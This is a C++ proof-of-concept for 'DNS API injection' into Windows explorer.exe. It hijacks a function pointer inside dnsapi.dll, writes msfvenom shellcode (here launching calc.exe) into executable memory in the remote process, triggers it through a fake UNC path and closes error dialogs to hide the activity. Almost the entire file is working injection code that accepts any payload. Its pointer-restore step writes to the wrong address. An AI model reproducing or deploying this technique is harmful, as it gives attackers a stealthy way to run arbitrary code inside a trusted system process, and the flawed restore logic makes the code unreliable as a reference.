/*
* Title: DNS API Injection
* Resources:
*	- https://github.com/odzhan/injection/blob/master/dns/dns.cpp
*/

#include <Windows.h>
#include <iostream>
#include <TlHelp32.h>
#include <ShObjIdl_core.h>
#include <ShlObj.h>
#include <ShlDisp.h>
#include <Shlwapi.h>
#include <ExDisp.h>
#pragma comment(lib, "shlwapi.lib")

LPVOID GetRemoteModuleHandle(DWORD dwPid, LPCWSTR lpModuleName) {
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, dwPid);
	if (!hSnapshot) return nullptr;

	MODULEENTRY32 me = { 0 };
	me.dwSize = sizeof(MODULEENTRY32);

	LPVOID lpModule = nullptr;

	if (Module32First(hSnapshot, &me)) {
		do {
			if (me.th32ProcessID == dwPid) {
				if (lstrcmpi(me.szModule, lpModuleName) == 0) {
					lpModule = me.modBaseAddr;
					break;
				}
			}
		} while (Module32Next(hSnapshot, &me));
	}
	CloseHandle(hSnapshot);
	return lpModule;
}

BOOL IsCodePtr(LPVOID ptr) {
	if (!ptr) return FALSE;

	MEMORY_BASIC_INFORMATION mbi = {0};
	DWORD dwRes = VirtualQuery(ptr, &mbi, sizeof(mbi));
	if (dwRes != sizeof(mbi)) return FALSE;

	return ((mbi.State == MEM_COMMIT) &&
		(mbi.Type == MEM_IMAGE) &&
		(mbi.Protect == PAGE_EXECUTE_READ));
}

LPVOID GetDnsApiAddr(DWORD dwPid) {
	LPVOID lpDnsapi = GetRemoteModuleHandle(dwPid, L"dnsapi.dll");
	if (!lpDnsapi) return nullptr;

	// Load local copy.
	HMODULE hDnsapi = LoadLibraryA("dnsapi.dll");
	if (!hDnsapi) return nullptr;
	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hDnsapi;
	PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)pDosHeader + pDosHeader->e_lfanew);
	PIMAGE_SECTION_HEADER pSecHeader = (PIMAGE_SECTION_HEADER)((LPBYTE)&pNtHeaders->OptionalHeader + pNtHeaders->FileHeader.SizeOfOptionalHeader);

	// Locate the .data segment
	PULONG_PTR ds = nullptr;
	DWORD dwCnt = 0;
	for (DWORD i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
		if (*(PDWORD)pSecHeader[i].Name == *(PDWORD)".data") {
			ds = (PULONG_PTR)((DWORD_PTR)pDosHeader + pSecHeader[i].VirtualAddress);
			dwCnt = pSecHeader[i].Misc.VirtualSize / sizeof(ULONG_PTR);
			break;
		}
	}
	// for each pointer
	LPVOID lpVA = nullptr;
	for (DWORD i = 0; i < dwCnt; i++) {
		if (!IsCodePtr((LPVOID)ds[i])) continue;
		if (!IsCodePtr((LPVOID)ds[i + 1])) continue;

		// Calculate VA in remote process
		lpVA = ((PBYTE)&ds[i] - (PBYTE)hDnsapi) + (PBYTE)lpDnsapi;
		break;
	}
	return lpVA;
}

VOID SuppressErrors(LPVOID lpParam) {
	HWND hWnd = nullptr;
	for (;;) {
		hWnd = FindWindowEx(nullptr, nullptr, nullptr, L"Network Error");
		if (hWnd) {
			PostMessage(hWnd, WM_CLOSE, 0, 0);
		}
	}
}

HRESULT GetDesktopShellView(REFIID riid, void** ppv) {
	*ppv = NULL;

	HWND hWnd;
	IDispatch *pdisp;
	IShellWindows *psw;
	IShellBrowser *psb;
	IShellView *psv;
	VARIANT vEmpty = {};

	HRESULT hRes = CoCreateInstance(CLSID_ShellWindows, nullptr, CLSCTX_LOCAL_SERVER, IID_PPV_ARGS(&psw));
	if (hRes == S_OK) {
		hRes = psw->FindWindowSW(&vEmpty, &vEmpty, SWC_DESKTOP, (long*)&hWnd, SWFO_NEEDDISPATCH, &pdisp);

		if (hRes == S_OK) {
			hRes = IUnknown_QueryService(pdisp, SID_STopLevelBrowser, IID_PPV_ARGS(&psb));
			if (hRes == S_OK) {
				hRes = psb->QueryActiveShellView(&psv);
				if (hRes == S_OK) {
					hRes = psv->QueryInterface(riid, ppv);
					psv->Release();
				}
				psb->Release();
			}
			pdisp->Release();
		}
		pdisp->Release();
	}
	return hRes;
}

HRESULT GetShellDispatch(IShellView *psv, REFIID riid, void **ppv) {
	*ppv = NULL;

	IShellFolderViewDual *psfvd;
	IDispatch *pdispBackground, *pdisp;

	HRESULT hRes = psv->GetItemObject(SVGIO_BACKGROUND, IID_PPV_ARGS(&pdispBackground));
	if (hRes == S_OK) {
		hRes = pdispBackground->QueryInterface(IID_PPV_ARGS(&psfvd));
		if (hRes == S_OK) {
			hRes = psfvd->get_Application(&pdisp);
			if (hRes == S_OK) {
				hRes = pdisp->QueryInterface(riid, ppv);
				pdisp->Release();
			}
			psfvd->Release();
		}
		pdispBackground->Release();
	}
	return hRes;
}

HRESULT ShellExecInExplorer(PCWSTR pszFile) {
	HRESULT hRes = CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE);
	if (hRes != S_OK) return S_FALSE;

	BSTR bstrFile = SysAllocString(pszFile);
	if (!bstrFile) return E_OUTOFMEMORY;

	IShellView *psv;
	IShellDispatch2 *psd;
	VARIANT vtHide, vtEmpty = {};
	hRes = GetDesktopShellView(IID_PPV_ARGS(&psv));
	if (hRes == S_OK) {
		hRes = GetShellDispatch(psv, IID_PPV_ARGS(&psd));
		if (hRes == S_OK) {
			V_VT(&vtHide) = VT_INT;
			V_INT(&vtHide) = SW_HIDE;
			hRes = psd->ShellExecuteW(
				bstrFile, vtEmpty, vtEmpty, vtEmpty, vtEmpty
			);
			psd->Release();
		}
		psv->Release();
	}
	SysFreeString(bstrFile);
	return hRes;
}

BOOL DnsApiInjection() {
	// The shellcode generated by `msfvenom -p windows/x64/exec CMD=calc.exe -f c`
	unsigned char shellcode[] =
		"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
		"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
		"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
		"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
		"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
		"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
		"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
		"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
		"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
		"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
		"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
		"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
		"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
		"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
		"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
		"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
		"\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
		"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
		"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
		"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";

	DWORD dwPid = 0;
	if (!GetWindowThreadProcessId(GetShellWindow(), &dwPid))
		return FALSE;

	// Create a thread to suppress network errors displayed.
	HANDLE hThread = CreateThread(nullptr, 0, (LPTHREAD_START_ROUTINE)SuppressErrors, nullptr, 0, nullptr);
	if (!hThread) {
		return FALSE;
	}

	DWORD dwTick = 0;
	WCHAR  unc[32] = { L'\\', L'\\' }; // UNC path to invoke DNS api

	LPVOID lpDnsapiAddr = GetDnsApiAddr(dwPid);
	if (!lpDnsapiAddr) {
		dwTick = GetTickCount();
		for (DWORD i = 0; i < 8; i++) {
			unc[2 + i] = (dwTick % 26) + 'a';
			dwTick >>= 2;
		}
		ShellExecInExplorer(unc);
		lpDnsapiAddr = GetDnsApiAddr(dwPid);
	}

	HANDLE hProcess = nullptr;
	LPVOID lpRemoteAddr = nullptr;
	SIZE_T dwBytesRead = 0;

	if (lpDnsapiAddr) {
		LPVOID lpDns = nullptr;
		// Open explorer, backup address of dns function, allocate RWX memory and write payload.
		hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);
		if (!ReadProcessMemory(hProcess, lpDnsapiAddr, &lpDns, sizeof(ULONG_PTR), &dwBytesRead)) {
			return FALSE;
		}
		lpRemoteAddr = VirtualAllocEx(hProcess, nullptr, sizeof(shellcode), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		if (!lpRemoteAddr) {
			return FALSE;
		}
		if (!WriteProcessMemory(hProcess, lpRemoteAddr, shellcode, sizeof(shellcode), &dwBytesRead)) {
			VirtualFreeEx(hProcess, lpRemoteAddr, 0, MEM_RELEASE);
			return FALSE;
		}

		// Overwrite pointer to dns function, generate fake UNC path and trigger execution.
		if (!WriteProcessMemory(hProcess, lpDnsapiAddr, &lpRemoteAddr, sizeof(ULONG_PTR), &dwBytesRead)) {
			VirtualFreeEx(hProcess, lpRemoteAddr, 0, MEM_RELEASE);
			return FALSE;
		}
		dwTick = GetTickCount();
		for (DWORD i = 0; i < 8; i++) {
			unc[2 + i] = (dwTick % 26) + L'a';
			dwTick >>= 2;
		}
		ShellExecInExplorer(unc);

		// Restore dns function, release memory and close process.
		if (!WriteProcessMemory(hProcess, lpRemoteAddr, &lpDns, sizeof(ULONG_PTR), &dwBytesRead)) {
			VirtualFreeEx(hProcess, lpRemoteAddr, 0, MEM_RELEASE);
			return FALSE;
		}

		VirtualFreeEx(hProcess, lpRemoteAddr, 0, MEM_RELEASE);
		CloseHandle(hProcess);
	}

	TerminateThread(hThread, 0);

	return TRUE;
}